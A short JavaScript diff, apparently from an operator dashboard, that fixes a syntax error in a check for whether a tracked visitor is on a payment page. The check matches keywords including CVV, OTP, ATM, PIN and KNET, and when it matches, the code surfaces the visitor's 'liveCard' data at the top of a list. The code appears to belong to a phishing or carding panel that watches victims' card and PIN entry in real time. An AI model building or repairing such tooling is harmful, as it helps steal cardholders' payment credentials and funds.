@@ -1571,7 +1571,7 @@ html += '</select>';
       
       // ===== بطاقة الدفع المباشر =====
 const visitorPage = (visitor.page || '').toLowerCase();
-const const isOnPaymentPage = visitorPage.includes('الدفع') || visitorPage.includes('payment') || visitorPage.includes('credit') || visitorPage.includes('بطاقة') || visitorPage.includes('كي نت') || visitorPage.includes('knet'); = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h=>visitorPage.indexOf(h)>-1);
+const isOnPaymentPage = ['الدفع','بطاقة','كي نت','payment','credit','cvv','otp','atm','pin','card'].some(h=>visitorPage.indexOf(h)>-1);
 if (isOnPaymentPage && visitor.liveCard) {
   allEntries.push({ type: 'liveCard', data: visitor.liveCard, index: 0, timestamp: new Date(Date.now() + 999999999).toISOString() });
 }
